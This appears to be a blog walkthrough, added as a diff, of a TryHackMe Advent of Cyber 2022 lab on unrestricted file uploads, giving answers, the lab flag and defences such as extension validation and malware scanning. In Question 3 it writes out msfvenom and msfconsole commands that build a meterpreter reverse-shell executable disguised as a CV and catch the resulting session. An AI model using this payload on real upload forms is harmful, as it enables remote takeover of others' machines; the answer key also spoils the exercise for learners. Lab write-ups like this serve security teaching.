@@ -1,0 +1,77 @@
+---
+title: "Advent of Cyber 2022 - Day 15"
+description: "Walkthrough - AoC 2022 - Day 15 - \"Santa is looking for a sidekick\""
+pubDate: 'Dec 15 2022'
+readingTime: 2
+platform: TryHackMe
+platformLink: https://tryhackme.com/room/adventofcyber4
+category: "Purple Team: Secure Coding"
+---
+import ImageContainer from '../../../components/stub/ImageContainer.astro'
+
+import img2 from '../../../assets/images/walkthrough/thm/aoc-2022/day15/2.png'
+import img3_1 from '../../../assets/images/walkthrough/thm/aoc-2022/day15/3.1.png'
+import img3_2 from '../../../assets/images/walkthrough/thm/aoc-2022/day15/3.2.png'
+import img3_3 from '../../../assets/images/walkthrough/thm/aoc-2022/day15/3.3.png'
+import img3_4 from '../../../assets/images/walkthrough/thm/aoc-2022/day15/3.4.png'
+import img3_5 from '../../../assets/images/walkthrough/thm/aoc-2022/day15/3.5.png'
+
+### Question 1
+
+> What is the name given to file uploads that allow threat actors to upload any files that they want?
+
+Answer: `Unrestricted`
+
+### Question 2
+
+> What is the title of the web application developed by Santa's freelancer?
+
+<ImageContainer image={img2} style="width: 70%; height: auto;" alt="Screenshot of the web application title" nodesc />
+
+Answer: `SantaSideKick2`
+
+### Question 3
+
+> What is the value of the flag stored in the HR Elf's Documents directory?
+
+We start by using `msfvenom` to create a malicious executable: `msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=$IP LPORT="4321" -f exe -o cv-maya.exe`
+
+<ImageContainer image={img3_1} style="width: 70%; height: auto;" alt="Screenshot of msfvenom generating the payload" nodesc />
+
+We then tell the shell to create a reverse shell handler, with automatic meterpreter elevation:
+
+`sudo msfconsole -q -x "use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST $IP; set LPORT '4231'; exploit"`
+
+<ImageContainer image={img3_2} style="width: 70%; height: auto;" alt="Screenshot of the meterpreter handler" nodesc />
+
+We then upload our "CV" to the platform:
+
+<ImageContainer image={img3_3} style="width: 70%; height: auto;" alt="Screenshot of uploading the CV" nodesc />
+
+The "CV" gets executed, leading us to a meterpreter session:
+
+<ImageContainer image={img3_4} style="width: 70%; height: auto;" alt="Screenshot of the meterpreter session" nodesc />
+
+We situate ourselves and then navigate to the target directory to get the flag:
+
+<ImageContainer image={img3_5} style="width: 70%; height: auto;" alt="Screenshot of the flag in the HR Elf's Documents directory" nodesc />
+
+Answer: `THM{Naughty.File.Uploads.Can.Get.You.RCE}`
+
+### Question 4
+
+> What defence technique can be implemented to ensure that specific file types can be uploaded?
+
+Answer: `File Extension Validation`
+
+### Question 5
+
+> What defence technique can be used to make sure the threat actor cannot recover their file again by simply using the file name?
+
+Answer: `File Renaming`
+
+### Question 6
+
+> What defence technique can be used to make sure malicious files that can hurt elves are not uploaded?
+
+Answer: `Malware Scanning`
